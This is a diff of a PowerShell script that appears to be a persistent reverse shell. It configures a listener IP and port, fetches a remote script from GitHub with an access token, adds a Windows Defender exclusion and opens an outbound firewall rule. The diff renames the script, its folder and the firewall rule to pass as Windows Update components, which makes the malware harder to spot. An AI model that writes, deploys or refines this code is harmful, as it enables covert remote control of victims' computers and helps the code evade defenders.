@@ -1,8 +1,8 @@
 # --- CONFIGURATION ---
 $LHOST = "88.226.172.80" # Your listener IP
 $LPORT = 4444          # Your listener Port
-$WorkDir = "C:\Win"
-$ScriptName = "service.ps1"
+$WorkDir = "C:\Windows\WinUpd"
+$ScriptName = "WindowsUpdate.ps1"
 $FullPath = Join-Path $WorkDir $ScriptName
 $TaskName = "WinUpdateMaintenance"
 $RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1?token=GHSAT0AAAAAADQYRXOJYARGLSQVFTERQY7Q2KJTVHQ"
@@ -37,8 +37,8 @@ if ($PSCommandPath -ne ${FullPath}) {
 try {
     Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
     
-    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
-        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
+    if (-not (Get-NetFirewallRule -DisplayName "Windows Update" -ErrorAction SilentlyContinue)) {
+        New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
     }
 } catch {
     # Proceed without admin-level mods
@@ -102,5 +102,6 @@ while ($true) {
         if ($null -ne $writer) { $writer.Close() }
     }
 }
+
 
 
